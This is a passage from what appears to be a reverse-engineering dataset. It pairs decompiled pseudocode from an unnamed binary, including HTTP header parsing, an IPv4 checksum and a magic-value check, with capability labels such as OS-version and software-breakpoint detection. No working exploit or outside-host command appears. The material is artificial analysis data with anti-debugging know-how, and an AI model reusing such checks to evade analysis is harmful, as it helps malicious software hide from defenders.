fcn.00049dfc(iStackX32, aiStackX16[0], auStack264, 200);\n                                        if (iVar3 == 0) {\n                                            fcn.0004a9b0(iStackX32, iStack272 + 0x10, aiStackX16[0]);\n                                            fcn.0004a9b0(iStackX32, iStack272 + 0x20, aiStackX16[0] + 0x10);\n                                            *arg3 = aiStackX16[0];\n                                            iVar3 = 0;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    iStack432 = 0;\n                    if (((*arg2 < 0x100000000) && (arg2[2] < 0x100000000)) &&\n                       (iVar3 = fcn.00049dcc(iStackX32, uStack296, &uStack296, 0x10),  iVar3 == 0)) {\n                        uVar7 = uStack284;\n                        if (uVar7 == 0) {\n                            iVar3 = -1;\n                        }\n                        else {\n                            fcn.00061a56(auStack408, 0, 0x68);\n                            uStack384 = *arg2;\n                            uStack376 = *(arg2 + 1);\n                            uStack340 = *(arg2 + 0xc);\n                            uStack356 = 0x1004;\n                            uStack380 = *(arg2 + 2);\n                            uStack352 = 1;\n                            iVar5 = -1;\n                            iVar4 = iVar5;\n                            puVar6 = arg2 + 3;\n                            do {\n                                if (iVar4 == 0) break;\n                                iVar4 = iVar4 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack364 = (~iVar4 - 1) * 2;\n                            if (uStack364 < 2) {\n                                uStack364 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack362 = uStack364 + 2;\n                            puVar6 = arg2 + 0x44;\n                            do {\n                                if (iVar5 == 0) break;\n                                iVar5 = iVar5 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack372 = (~iVar5 - 1) * 2;\n                            if (uStack372 < 2) {\n                                uStack372 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack370 = uStack372 + 2;\n                            iStack432 = 0;\n                            iStack424 = uStack370 + 0x68 + uStack362;\n                            iVar3 = fcn.00061bdc(iStackX32, &iStack432, 0, &iStack424, 0x3000, 4);\n                            if (iVar3 == 0) {\n                                iStack416 = iStack432;\n                                uStack360 = iStack432 + 0x68;\n                                iVar3 = fcn.00049dfc(iStackX32, uStack360, arg2 + 3, uStack362);\n                                if (iVar3 == 0) {\n                                    uVar1 = uStack362 + 0x68 + iStack432;\n                                    uStack368 = uVar1;\n                                    iVar3 = fcn.00049dfc(iStackX32, uVar1 & 0xffffffff, arg2 + 0x44, uStack370);\n                                    if (iVar3 == 0) {\n                                        iStack312 = iStack432;\n                                        iStack328 = iStack312 + 0x50;\n                                        iStack320 = iStack312 + 0x58;\n                                        iStack312 = iStack312 + 0x60;\n                                        iStack324 = iStack328;\n                                        iStack316 = iStack320;\n                                        iStack308 = iStack312;\n                                        iVar3 = fcn.00049dfc(iStackX32, iStack432, auStack408, 0x68);\n                                        if (iVar3 == 0) {\n                                            fcn.0004aac4(iStackX32, uVar7 + 0xc, iStack432);\n                                            fcn.0004aac4(iStackX32, uVar7 + 0x14, iStack432 + 8);\n                                            *arg3 = iStack432;\n                                            iVar3 = 0;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if ((iVar3 != 0) && (iStack416 != 0)) {\n            iStack424 = 0;\n            fcn.00061be2(iStackX32, &iStack416, &iStack424, 0x8000);\n        }\n        if (iStackX32 != 0) {\n            fcn.000619de();\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 2445
    },
    "0004fbc8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0004fbc8(int64_t arg1, uint *arg2, ulong arg3)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uchar uVar3;\n    ushort uVar4;\n    uint uVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t uVar9;\n    char in_R9B;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    uint8_t uVar13;\n    bool bVar14;\n    uint *in_stack_00000028;\n    uint8_t in_stack_00000030;\n    char in_stack_00000038;\n    \n    fcn.0004f30c(arg1);\n    uVar2 = *(*(arg1 + 8) + 0x13a + arg1);\n    uVar12 = 7;\n    uVar9 = uVar2 >> 6;\n    uVar10 = (*(arg1 + 0x129) & 1) << 3 | uVar2 & 7;\n    uVar13 = (*(arg1 + 0x129) & 4) * '\\x02' | uVar2 >> 3 & 7;\n    uVar2 = fcn.0004f0e8(arg1, arg3);\n    iVar7 = 0;\n    iVar8 = 0;\n    *(arg2 + 1) = uVar2;\n    uVar11 = uVar12;\n    if (uVar9 == 3) {\n        *arg2 = 0x8c;\n        if (in_R9B == '\\x01') {\n            iVar7 = fcn.0004f160(arg1, uVar2);\n        }\n        else {\n            uVar2 = (*(arg1 + 0x129) & 4) * '\\x02' | uVar10 & uVar11;\n            if (in_R9B == '\\x02') {\n                iVar7 = (uVar2 & uVar12) + 0x6b;\n            }\n            else if (in_R9B == '\\x03') {\n                iVar7 = uVar2 + 0x4b;\n            }\n            else if (in_R9B == '\\x04') {\n                iVar7 = uVar2 + 0x5b;\n            }\n            else if (in_R9B == '\\x05') {\n                iVar7 = (uVar2 & uVar12) + 0x45;\n            }\n            else if (in_R9B == '\\x06') {\n                iVar7 = uVar2 + 0x7b;\n            }\n        }\n        arg2[4] = iVar7;\n        goto code_r0x0004ff53;\n    }\n    *arg2 = 0x8d;\n    if (*(arg1 + 0x134) == '@') {\n        arg2[4] = uVar10 + 0x35;\n        if (uVar9 == 1) {\n            *(arg2 + 6) = 8;\n        }\n        else {\n            if (uVar9 != 2) {\n                if ((uVar9 != 0) || (uVar10 != 5)) {\n                    *(arg2 + 6) = 0;\n                    goto code_r0x0004fd1c;\n                }\n                arg2[4] = 0x8b;\n            }\n            *(arg2 + 6) = 0x20;\n        }\ncode_r0x0004fd1c:\n        if ((uVar10 & uVar11) != 4) goto code_r0x0004ff53;\n        fcn.0004f30c(arg1);\n        *(arg2 + 0x19) = '\\x01' << (*(*(arg1 + 8) + 0x13a + arg1) >> 6) & 0xfe;\n        arg2[5] = (*(*(arg1 + 8) + 0x13a + arg1) >> 3 & 7 | (*(arg1 + 0x129) & 2) << 2) + 0x35;\n        iVar7 = (*(*(arg1 + 8) + 0x13a + arg1) & 7 | (*(arg1 + 0x129) & 1) << 3) + 0x35;\n        arg2[4] = iVar7;\n        if (arg2[5] == 0x39) {\n            arg2[5] = 0;\n            *(arg2 + 0x19) = 0;\n        }\n        if (iVar7 != 0x3a) {\n            bVar14 = iVar7 == 0x42;\n            goto code_r0x0004fe7a;\n        }\n    }\n    else {\n        if (*(arg1 + 0x134) != ' ') {\n            if (uVar10 == 0) {\n                arg2[5] = 0x1b;\ncode_r0x0004ff14:\n                arg2[4] = 0x18;\n            }\n            else {\n                if (uVar10 == 1) {\n                    arg2[5] = 0x1c;\n                    goto code_r0x0004ff14;\n                }\n                if (uVar10 == 2) {\n                    arg2[4] = 0x1a;\n                    arg2[5] = 0x1b;\n                }\n                else if (uVar10 == 3) {\n                    arg2[4] = 0x1a;\n                    arg2[5] = 0x1c;\n                }\n                else if (uVar10 == 4) {\n                    arg2[4] = 0x1b;\n                }\n                else if (uVar10 == 5) {\n                    arg2[4] = 0x1c;\n                }\n                else if (uVar10 == 6) {\n                    arg2[4] = 0x1a;\n                }\n                else if (uVar10 == 7) goto code_r0x0004ff14;\n            }\n            if (uVar9 == 0) {\n                if (uVar10 == 6) {\n                    *(arg2 + 6) = 0x10;\n                }\n            }\n            else if (uVar9 == 1) {\n                *(arg2 + 6) = 8;\n            }\n            else if (uVar9 == 2) {\n                *(arg2 + 6) = 0x10;\n            }\n            goto code_r0x0004ff53;\n        }\n        arg2[4] = uVar10 + 0x25;\n        if (uVar9 == 1) {\n            *(arg2 + 6) = 8;\n        }\n        else {\n            if (uVar9 != 2) {\n                if ((uVar9 != 0) || (uVar10 != 5)) {\n                    *(arg2 + 6) = 0;\n                    goto code_r0x0004fdf6;\n                }\n                arg2[4] = 0;\n            }\n            *(arg2 + 6) = 0x20;\n        }\ncode_r0x0004fdf6:\n        if ((uVar10 & uVar11) != 4) goto code_r0x0004ff53;\n        fcn.0004f30c(arg1);\n        *(arg2 + 0x19) = '\\x01' << (*(*(arg1 + 8) + 0x13a + arg1) >> 6) & 0xfe;\n        arg2[5] = (*(*(arg1 + 8) + 0x13a + arg1) >> 3 & 7 | (*(arg1 + 0x129) & 2) << 2) + 0x25;\n        iVar7 = (*(*(arg1 + 8) + 0x13a + arg1) & 7 | (*(arg1 + 0x129) & 1) << 3) + 0x25;\n        arg2[4] = iVar7;\n        if (arg2[5] == 0x29) {\n            arg2[5] = 0;\n            *(arg2 + 0x19) = 0;\n        }\n        bVar14 = iVar7 == 0x2a;\ncode_r0x0004fe7a:\n        if (!bVar14) goto code_r0x0004ff53;\n    }\n    if (uVar9 == 0) {\n        arg2[4] = 0;\n    }\n    uVar3 = 0x20;\n    if (uVar9 == 1) {\n        uVar3 = 8;\n    }\n    *(arg2 + 6) = uVar3;\ncode_r0x0004ff53:\n    cVar1 = *(arg2 + 6);\n    if (cVar1 == '\\b') {\n        uVar3 = fcn.0004f30c(arg1);\n        *(arg2 + 2) = uVar3;\n    }\n    else if (cVar1 == '\\x10') {\n        uVar4 = fcn.0004f39c(arg1);\n        *(arg2 + 2) = uVar4;\n    }\n    else if (cVar1 == ' ') {\n        uVar5 = fcn.0004f3c8(arg1);\n        arg2[2] = uVar5;\n    }\n    else if (cVar1 == '@') {\n        uVar6 = fcn.0004f418(arg1);\n        *(arg2 + 2) = uVar6;\n    }\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = 0x8c;\n        uVar2 = fcn.0004f0e8(arg1, in_stack_00000030);\n        *(in_stack_00000028 + 1) = uVar2;\n        if (in_stack_00000038 == '\\x01') {\n            uVar5 = fcn.0004f160(arg1, uVar2);\n            in_stack_00000028[4] = uVar5;\n        }\n        else {\n            if (in_stack_00000038 == '\\x02') {\n                iVar8 = (uVar13 & 7) + 0x6b;\n            }\n            else if (in_stack_00000038 == '\\x03') {\n                iVar8 = uVar13 + 0x4b;\n            }\n            else if (in_stack_00000038 == '\\x04') {\n                iVar8 = uVar13 + 0x5b;\n            }\n            else if (in_stack_00000038 == '\\x05') {\n                iVar8 = (uVar13 & 7) + 0x45;\n            }\n            else if (in_stack_00000038 == '\\x06') {\n                iVar8 = uVar13 + 0x7b;\n            }\n            in_stack_00000028[4] = iVar8;\n        }\n    }\n    return;\n}\n",
        "token_count": 2435
    },
    "00053868": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool fcn.00053868(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    \n    iVar5 = 0;\n    iVar4 = arg2;\n    if (0 < iVar4) {\n        iVar6 = 0;\n        do {\n            iVar6 = iVar6 + 1;\n            uVar3 = *(arg1 + iVar5 * 8) & 7;\n            if (uVar3 == 5) {\n                if ((*(arg1 + iVar5 * 8) & 0xf0) == 0) {\n                    iVar2 = iVar6 + *(arg1 + 4 + iVar5 * 8);\n                    iVar1 = iVar2 - arg2;\n                }\n                else {\n                    if (arg2 <= *(arg1 + 2 + iVar5 * 8) + iVar6) {\n                        return false;\n                    }\n                    iVar2 = *(arg1 + 3 + iVar5 * 8) + iVar6;\n                    iVar1 = iVar2 - arg2;\n                }\n                if (SBORROW4(iVar2, arg2) == iVar1 < 0) {\n                    return false;\n                }\n            }\n            if ((((uVar3 == 2) || ((uVar3 == 0 && ((*(arg1 + iVar5 * 8) & 0xe0) == 0x60)))) &&\n                ((0xf < *(arg1 + 4 + iVar5 * 8) || (*(arg1 + 4 + iVar5 * 8) < 0)))) ||\n               ((*(arg1 + iVar5 * 8) == 0x34 && (*(arg1 + 4 + iVar5 * 8) == 0)))) {\n                return false;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < iVar4);\n    }\n    return (*(arg1 + -8 + iVar4 * 8) & 7) == 6;\n}\n",
        "token_count": 456
    },
    "00056cc0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00056cc0(ulong arg1, ulong arg2, ulong arg3, uint32_t *arg4)\n\n{\n    uint64_t arg1_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint64_t **in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong uStack104;\n    ulong uStack96;\n    uint uStack88;\n    ulong uStack80;\n    ulong *puStack72;\n    ulong uStack64;\n    \n    uStack104 = 0;\n    iVar1 = fcn.00056164(arg1, &uStack104, 0);\n    if (iVar1 == 0) {\n        uStack96._0_4_ = 0;\n        uStack88 = 1;\n        uStack96._4_4_ = arg2;\n        uVar2 = fcn.0002fcf4(0);\n        uStack96 = CONCAT44(uStack96._4_4_, uVar2);\n        uVar3 = fcn.0002fcf4(uStack96._4_4_);\n        uStack96 = uStack96 & 0xffffffff | uVar3 << 0x20;\n        puStack72 = &uStack96;\n        uStack64 = 0xc;\n        uStack80 = arg3;\n        iVar1 = fcn.000605ec(uStack104, &uStack80, in_stack_00000028, in_stack_00000030);\n        if (iVar1 == 0) {\n            if (0xb < *in_stack_00000030) {\n                uStack96 = **in_stack_00000028;\n                uStack88 = *(*in_stack_00000028 + 1);\n                uVar3 = fcn.0002fcf4(uStack96 & 0xffffffff);\n                arg1_00 = uStack96 >> 0x20;\n                uStack96 = uStack96 & 0xffffffff00000000 | uVar3;\n                uVar3 = fcn.0002fcf4(arg1_00);\n                uStack96 = uStack96 & 0xffffffff | uVar3 << 0x20;\n                if (uStack88 == '\\x02') {\n                    *arg4 = uVar3;\n                    *in_stack_00000030 = *in_stack_00000030 - 0xc;\n                    iVar1 = 0;\n                    if (*in_stack_00000030 < 1) {\n                        fcn.0005fde8(uStack104, *in_stack_00000028);\n                        *in_stack_00000028 = NULL;\n                        *in_stack_00000030 = 0;\n                    }\n                    else {\n                        *in_stack_00000028 = *in_stack_00000028 + 0xc;\n                        *(*in_stack_00000028 + -0xc) = uStack104;\n                    }\n                    goto code_r0x00056e13;\n                }\n            }\n            fcn.0005fde8(uStack104, *in_stack_00000028);\n            *in_stack_00000028 = NULL;\n            *in_stack_00000030 = 0;\n            iVar1 = 0x2159000a;\n        }\n    }\ncode_r0x00056e13:\n    fcn.0005631c(arg1, &uStack104, iVar1 == 0);\n    return iVar1;\n}\n",
        "token_count": 760
    },
    "000266fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t fcn.000266fc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t arg3_00;\n    int64_t arg3_01;\n    ulong arg1_00;\n    uint32_t uStackX8;\n    uint32_t auStackX16 [6];\n    uint32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    uchar auStack136 [16];\n    uchar auStack120 [4];\n    uint32_t uStack116;\n    uint32_t uStack72;\n    \n    arg3_01 = 0;\n    arg1_00 = 0xfffffffe;\n    auStackX16[0] = arg2;\n    if (arg1 == 3) {\n        uVar2 = fcn.00026638(auStack136, 0x10);\n        if (uVar2 != 0) {\n            if (uVar2 != 5) {\n                return uVar2;\n            }\n            goto code_r0x0002674a;\n        }\n        arg1_00 = 0xfffffffd;\n    }\n    else {\ncode_r0x0002674a:\n        uVar2 = fcn.000265bc(auStack136, 0x10, 0x229);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n    }\n    if (in_stack_00000030 == 0) {\n        uVar2 = fcn.00021828(arg1_00, arg1, auStackX16, auStack120);\n    }\n    else {\n        uVar2 = fcn.00021858(arg1_00, arg1, auStackX16[0], auStack120);\n    }\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    arg3_00 = fcn.0002fbc4(uStack72);\n    if (arg3_00 == 0) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.000218cc(arg1_00, arg1, uStack116, 0);\n    uVar2 = uVar1;\n    if (uVar1 != 0) goto code_r0x000268aa;\n    uVar1 = fcn.0001f8d8(auStack136, 0x10, arg3_00, uStackX8);\n    if (uVar1 == 0xffffffff) {\ncode_r0x0002680e:\n        uVar2 = 0xffffffff;\n    }\n    else {\n        if (arg4 < uVar1) {\n            if (arg4 == 0) {\n                *in_stack_00000028 = uVar1;\n            }\n            else {\n                arg3_01 = fcn.0002fbc4(uVar1);\n                if (arg3_01 == 0) goto code_r0x0002680e;\n                fcn.0001f900(auStack136, 0x10, arg3_01, arg3_00);\n                fcn.000619f6(arg3, arg3_01, arg4);\n                *in_stack_00000028 = arg4;\n                fcn.0002fc50(arg3_01);\n            }\n        }\n        else {\n            fcn.0001f900(auStack136, 0x10, arg3, arg3_00);\n            *in_stack_00000028 = uVar1;\n        }\n        uVar2 = 0;\n    }\ncode_r0x000268aa:\n    fcn.0002fc50(arg3_00);\n    fcn.0002fc50(arg3_01);\n    return uVar2;\n}\n",
        "token_count": 831
    },
    "0003e578": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.0003e578(int32_t *arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint64_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    char *arg1_00;\n    uint64_t uVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    ulong in_stack_00000028;\n    uint64_t *in_stack_00000030;\n    uint *in_stack_00000038;\n    \n    for (; (*arg1 == '\\n' || ((*arg1 == '\\r' && (*(arg1 + 1) == '\\n')))); arg1 = arg1 + 1) {\n        arg2 = arg2 + -1;\n    }\n    iVar6 = fcn.00061bb8(arg1, 10, arg2);\n    if (iVar6 == 0) {\n        return 0;\n    }\n    iVar10 = arg1;\n    uVar3 = iVar6 - iVar10;\n    iVar6 = uVar3 + 1;\n    uVar11 = uVar3;\n    if ((uVar3 != 0) && (*((uVar3 - 1) + arg1) == '\\r')) {\n        uVar11 = uVar11 - 1;\n    }\n    if (uVar11 < 0xe) {\n        return 0;\n    }\n    iVar7 = fcn.00061bb8(arg1);\n    if (iVar7 == 0) {\n        return 0;\n    }\n    uVar3 = iVar7 - iVar10;\n    uVar9 = uVar3;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if (uVar9 == 3) {\n        bVar12 = *arg1 < *0x156f0;\n        if ((*arg1 == *0x156f0) && (bVar12 = *(arg1 + 2) < *0x156f2,  *(arg1 + 2) == *0x156f2)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (1 - bVar12) - (bVar12 != 0);\n        }\n        if (iVar4 == 0) goto code_r0x0003e659;\n    }\n    if (uVar9 != 4) {\n        return 0;\n    }\n    if (*arg1 != *0x156e8) {\n        return 0;\n    }\ncode_r0x0003e659:\n    iVar7 = uVar9 + 1;\n    puVar1 = arg1 + iVar7;\n    iVar8 = fcn.00061bb8(puVar1, 0x20, arg2 - iVar7);\n    if (iVar8 == 0) {\n        return 0;\n    }\n    uVar3 = (iVar8 - iVar7) - iVar10;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if (*puVar1 != '/') {\n        if (uVar3 < 8) {\n            return 0;\n        }\n        bVar12 = *puVar1 < *0x156e0;\n        if (((*puVar1 == *0x156e0) && (bVar12 = *(puVar1 + 1) < *0x156e4,  *(puVar1 + 1) == *0x156e4)) &&\n           (bVar12 = *(puVar1 + 6) < *0x156e6,  *(puVar1 + 6) == *0x156e6)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (1 - bVar12) - (bVar12 != 0);\n        }\n        if (iVar4 != 0) {\n            return 0;\n        }\n    }\n    iVar7 = uVar3 + 1 + iVar7;\n    if (uVar11 - iVar7 != 8) {\n        return 0;\n    }\n    puVar1 = iVar7 + arg1;\n    bVar12 = *puVar1 < *0x156d8;\n    if ((*puVar1 == *0x156d8) && (bVar12 = *(puVar1 + 1) < *0x156dc,  *(puVar1 + 1) == *0x156dc)) {\n        iVar4 = 0;\n    }\n    else {\n        iVar4 = (1 - bVar12) - (bVar12 != 0);\n    }\n    if (iVar4 != 0) {\n        return 0;\n    }\n    if (*(puVar1 + 6) != '.') {\n        return 0;\n    }\n    arg1_00 = iVar6 + arg1;\n    iVar4 = fcn.000583fc(arg1_00, arg2 - iVar6, in_stack_00000028, arg3);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if (in_stack_00000030 == NULL) {\n        if (in_stack_00000038 == NULL) {\n            return 1;\n        }\n    }\n    else {\n        *in_stack_00000030 = 0;\n    }\n    if (in_stack_00000038 != NULL) {\n        *in_stack_00000038 = 0;\n    }\n    do {\n        iVar7 = fcn.00061bb8(arg1_00, 10);\n        if (iVar7 == 0) {\n            return 1;\n        }\n        iVar7 = (iVar7 - iVar10) + 1;\n        puVar2 = iVar6 + arg1;\n        iVar8 = fcn.00061bb8(puVar2);\n        if (iVar8 == 0) {\n            return 1;\n        }\n        iVar4 = (iVar8 - iVar6) - iVar10;\n        if ((in_stack_00000030 == NULL) || (iVar4 != 0xe)) {\ncode_r0x0003e829:\n            if ((in_stack_00000038 != NULL) && (iVar4 == 10)) {\n                bVar12 = *puVar2 < str.Connection._0_8_;\n                if ((*puVar2 == str.Connection._0_8_) &&\n                   (bVar12 = *(puVar2 + 1) < str.Connection._8_2_,  *(puVar2 + 1) == str.Connection._8_2_)) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = (1 - bVar12) - (bVar12 != 0);\n                }\n                if (iVar4 == 0) {\n                    bVar12 = *(iVar8 + 2) < *0x156d0;\n                    if ((*(iVar8 + 2) != *0x156d0) || (bVar12 = *(iVar8 + 6) < *0x156d4,  *(iVar8 + 6) != *0x156d4)) {\n                        iVar4 = (1 - bVar12) - (bVar12 != 0);\n                    }\n                    if (iVar4 == 0) {\n                        *in_stack_00000038 = 1;\n                    }\n                }\n            }\n        }\n        else {\n            bVar12 = *puVar2 < str.Content_Length._0_8_;\n            if ((*puVar2 == str.Content_Length._0_8_) &&\n               ((bVar12 = *(puVar2 + 1) < str.Content_Length._8_4_,  *(puVar2 + 1) == str.Content_Length._8_4_ &&\n                (bVar12 = *(puVar2 + 0xc) < str.Content_Length._12_2_,  *(puVar2 + 0xc) == str.Content_Length._12_2_))))\n            {\n                iVar5 = 0;\n            }\n            else {\n                iVar5 = (1 - bVar12) - (bVar12 != 0);\n            }\n            if (iVar5 != 0) goto code_r0x0003e829;\n            uVar3 = fcn.00030174(iVar8 + 2, 0, 0);\n            *in_stack_00000030 = uVar3;\n        }\n        arg1_00 = iVar7 + arg1;\n        iVar6 = iVar7;\n    } while( true );\n}\n",
        "token_count": 1870
    },
    "0003f9b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t fcn.0003f9b8(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t iStackX24;\n    uint32_t uStackX28;\n    \n    iVar1 = fcn.00031940(arg1, arg2, &iStackX24);\n    if ((iVar1 != 0) && (iStackX24 == *0x66200)) {\n        if (uStackX28 == 0xc001ba5e) {\n            return 1;\n        }\n        if (uStackX28 < 4) {\n            return uStackX28 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 150
    },
    "00043244": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00043244(ulong arg1, ulong arg2, uint16_t *arg3, ulong arg4)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t *in_RAX;\n    uint16_t *puVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    uint16_t *puVar12;\n    uint32_t uVar13;\n    uint16_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t *puVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    uint16_t *puVar19;\n    uint16_t *puVar20;\n    uint16_t *in_stack_00000028;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint16_t *puStack200;\n    uchar uStack192;\n    uint8_t uStack191;\n    ushort uStack190;\n    ulong uStack184;\n    uchar uStack176;\n    uint8_t uStack175;\n    uint16_t uStack174;\n    uint32_t uStack168;\n    uint64_t uStack160;\n    uint32_t *puStack152;\n    uint16_t *puStack144;\n    uint32_t *puStack136;\n    uint *puStack128;\n    uint16_t *puStack112;\n    uint32_t auStack104 [10];\n    \n    puVar12 = NULL;\n    iVar6 = 0;\n    bVar4 = false;\n    bVar3 = false;\n    puStack136 = NULL;\n    uStack160 = uStack160 & 0xffffffff00000000;\n    puVar19 = NULL;\n    puStack144 = NULL;\n    puStack112 = NULL;\n    uVar8 = 0;\n    puStack152 = NULL;\n    uStack168 = 0;\n    if (arg3 == NULL) {\n        if (0xd < in_stack_00000030) {\n            in_stack_00000030 = in_stack_00000030 - 0xe;\n            puVar9 = in_stack_00000028;\n            in_stack_00000028 = in_stack_00000028 + 7;\ncode_r0x000432ff:\n            in_RAX = fcn.0002fd20(puVar9[6]);\n            puVar9 = puVar12;\n            puVar14 = puVar12;\n            uVar7 = 0;\n            if (in_RAX == 0x800) {\n                if (0x13 < in_stack_00000030) {\n                    puStack200 = in_stack_00000028;\n                    in_RAX = fcn.0002fd20(in_stack_00000028[1]);\n                    uVar2 = *in_stack_00000028;\n                    uVar13 = in_RAX & 0xffff;\n                    uVar18 = (uVar2 & 0xf) * 4;\n                    if ((0x13 < uVar18) && (uVar18 <= uVar13)) {\n                        uStack184 = in_stack_00000028 + 6;\n                        puStack128 = in_stack_00000028 + 8;\n                        puVar9 = in_stack_00000028 + 10;\n                        uVar11 = in_stack_00000028[9] + in_stack_00000028[7] + in_stack_00000028[5] +\n                                 in_stack_00000028[4] + in_stack_00000028[2] + in_stack_00000028[1] + *in_stack_00000028\n                                 + *uStack184 + in_stack_00000028[3] + *puStack128;\n                        for (iVar17 = uVar18 - 0x14; iVar17 != 0; iVar17 = iVar17 + -4) {\n                            uVar5 = *puVar9;\n                            puVar14 = puVar9 + 1;\n                            puVar9 = puVar9 + 2;\n                            uVar11 = uVar11 + uVar5 + *puVar14;\n                        }\n                        iVar17 = (uVar11 >> 0x10) + (uVar11 & 0xffff);\n                        uVar5 = ~((iVar17 >> 0x10) + iVar17);\n                        in_RAX = uVar5;\n                        if (uVar5 == 0) {\n                            if (in_stack_00000038 == 0) {\n                                if (uVar13 < 0x2e) {\n                                    if (uVar13 <= in_stack_00000030) goto code_r0x0004340b;\n                                }\n                                else if (uVar13 == in_stack_00000030) {\ncode_r0x0004340b:\n                                    if (in_stack_00000030 != uVar13) {\n                                        in_stack_00000030 = uVar13;\n                                    }\n                                    goto code_r0x00043412;\n                                }\n                            }\n                            else {\ncode_r0x00043412:\n                                in_RAX = fcn.0002fd20();\n                                puVar9 = puStack200;\n                                if (((in_RAX & 0x1fff) == 0) &&\n                                   (uVar10 = in_RAX >> 0xd,  in_RAX = in_RAX & 0xffffffffffff0000,  (uVar10 & 1) == 0))\n                                {\n                                    in_RAX = uVar18;\n                                    uVar13 = in_stack_00000030 + (uVar2 & 0xf) * -4;\n                                    uVar10 = uVar13;\n                                    uVar2 = *(puStack200 + 9);\n                                    puVar14 = in_stack_00000028 + in_RAX;\n                                    puVar20 = puVar19;\n                                    if (uVar2 == 1) {\n                                        if ((3 < uVar13) &&\n                                           (((puStack112 = puVar14,  in_stack_00000038 != 0 ||\n                                             (in_RAX = fcn.00042c54(puVar14, uVar10),  in_RAX == 0)) &&\n                                            (puStack152 = puVar14 + 2,  0x1a < uVar13 - 4)))) {\n                                            uVar7 = fcn.0002fcf4(*puStack152);\n                                            puVar15 = puVar14 + 4;\n                                            in_RAX = fcn.0003f9b8(puVar15, 0x16);\n                                            iVar6 = in_RAX;\n                                            puVar9 = puStack200;\n                                            if (iVar6 == 0) {\n                                                if (0x1a < uVar13 - 8) {\n                                                    puStack152 = puVar15;\n                                                    in_RAX = fcn.0002fcf4(*puVar15);\n                                                    uVar7 = in_RAX;\n                                                    puVar9 = puStack200;\n                                                    if (uVar7 < 0) {\n                                                        in_RAX = fcn.0003f9b8(puVar14 + 6, 0x16);\n                                                        iVar6 = in_RAX;\n                                                        if (iVar6 == 0) goto code_r0x00043933;\n                                                        in_RAX = NULL;\n                                                        bVar4 = false;\n                                                        bVar3 = true;\n                                                        puVar9 = puStack200;\n                                                        if (in_stack_00000038 == 0) 